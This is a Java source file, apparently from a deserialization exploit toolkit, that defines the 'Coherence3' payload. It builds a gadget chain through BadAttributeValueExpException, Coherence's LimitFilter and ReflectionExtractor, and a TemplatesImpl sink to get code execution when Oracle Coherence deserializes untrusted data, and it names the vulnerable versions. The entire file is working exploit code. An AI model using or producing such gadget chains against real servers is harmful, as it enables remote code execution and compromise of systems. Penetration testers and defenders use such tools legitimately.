package com.ppp.chain.coherence;

import com.ppp.KickOff;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;

import java.lang.reflect.Field;

/*
 * gadget:
 *      BadAttributeValueExpException.readObject()
 *          com.tangosol.util.filter.LimitFilter.toString()
 *              com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 */
@Dependencies({"coherence:3.7.1.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0"})
@Authors({Authors.CCKUAILONG})
@Sink({Sink.TemplatesImpl})
public class Coherence3 implements ObjectPayload<Object> {
    public static void main(String[] args) throws Exception {
        PayloadRunner.run(Coherence3.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject);

        return kickOffObject;
    }

    public Object getChain(Object templates) throws Exception {
        ValueExtractor valueExtractor = new ReflectionExtractor("getOutputProperties", new Object[0]);
        LimitFilter limitFilter = new LimitFilter();
        limitFilter.setTopAnchor(templates);

        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, valueExtractor);

        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, templates);

        return KickOff.badAttributeValueExpException(limitFilter);
    }
}